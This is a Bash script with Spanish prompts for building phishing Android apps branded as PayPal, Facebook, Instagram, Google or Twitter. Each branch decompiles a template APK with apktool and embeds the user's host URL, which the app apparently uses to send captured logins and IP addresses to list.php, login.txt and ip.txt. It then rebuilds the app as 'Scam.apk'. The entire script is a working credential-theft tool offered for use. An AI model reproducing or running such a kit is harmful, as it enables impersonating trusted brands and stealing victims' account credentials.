mkdir Apps
bash .banner
echo "Introduce la perzonalizacion que quieres de la app:"
echo ""
echo "1)PayPal"
echo "2)Facebook"
echo "3)Instagram"
echo "4)Google"
echo "5)Twitter"
echo ""
read num

# Zona if

if [ "$num" = "1" ]; then
cp .pp -r base.apk

dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/login.txt" |& tee .log)
vay=$(echo "$host/ip.txt" |& tee .ip)

apktool b base/ --output Apps/Scam.apk
cp $HOME/MgToLs/.apked -r Apps/ApkEditor.apk
rm -fr base
bash .banner
echo "Proceso terminado ahora solo falta instalar apkeditor pro"
echo "que esta en Apps/ y hacer lo que aparece en el video!!"
echo "[Tambien si estas en Linux puedes firmar el apk con apksigner]"
echo ""
read pause 
rm -fr base.apk
bash FishWait.sh
fi

if [ "$num" = "2" ]; then
cp .fc -r base.apk

dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/login.txt" |& tee .log)
vay=$(echo "$host/ip.txt" |& tee .ip)

apktool b base/ --output Apps/Scam.apk
cp $HOME/MgToLs/.apked -r Apps/ApkEditor.apk
rm -fr base
bash .banner
echo "Proceso terminado ahora solo falta instalar apkeditor pro"
echo "que esta en Apps/ y hacer lo que aparece en el video!!"
echo "[Tambien si estas en Linux puedes firmar el apk con apksigner]"
echo ""
read pause 
rm -fr base.apk
bash FishWait.sh
fi

if [ "$num" = "3" ]; then
cp .ig -r base.apk

dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/login.txt" |& tee .log)
vay=$(echo "$host/ip.txt" |& tee .ip)

apktool b base/ --output Apps/Scam.apk
cp $HOME/MgToLs/.apked -r Apps/ApkEditor.apk
rm -fr base
bash .banner
echo "Proceso terminado ahora solo falta instalar apkeditor pro"
echo "que esta en Apps/ y hacer lo que aparece en el video!!"
echo "[Tambien si estas en Linux puedes firmar el apk con apksigner]"
echo ""
read pause 
rm -fr base.apk
bash FishWait.sh
fi

if [ "$num" = "4" ]; then
cp .g -r base.apk

dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/login.txt" |& tee .log)
vay=$(echo "$host/ip.txt" |& tee .ip)

apktool b base/ --output Apps/Scam.apk
cp $HOME/MgToLs/.apked -r Apps/ApkEditor.apk
rm -fr base
bash .banner
echo "Proceso terminado ahora solo falta instalar apkeditor pro"
echo "que esta en Apps/ y hacer lo que aparece en el video!!"
echo "[Tambien si estas en Linux puedes firmar el apk con apksigner]"
echo ""
read pause 
rm -fr base.apk
bash FishWait.sh
fi

if [ "$num" = "5" ]; then
cp .tw -r base.apk

dpkg -i .ap/apktool_2.3.4_all.deb
apktool d --no-src base.apk
bash .banner
echo "Introduce el enlace que de tu host:"
read host

var=$(echo "$host/list.php" |& tee base/res/drawable-xhdpi-v4/image.png)
vat=$(echo "$host/login.txt" |& tee .log)
vay=$(echo "$host/ip.txt" |& tee .ip)

apktool b base/ --output Apps/Scam.apk
cp $HOME/MgToLs/.apked -r Apps/ApkEditor.apk
rm -fr base
bash .banner
echo "Proceso terminado ahora solo falta instalar apkeditor pro"
echo "que esta en Apps/ y hacer lo que aparece en el video!!"
echo "[Tambien si estas en Linux puedes firmar el apk con apksigner]"
echo ""
read pause 
rm -fr base.apk
bash FishWait.sh
fi

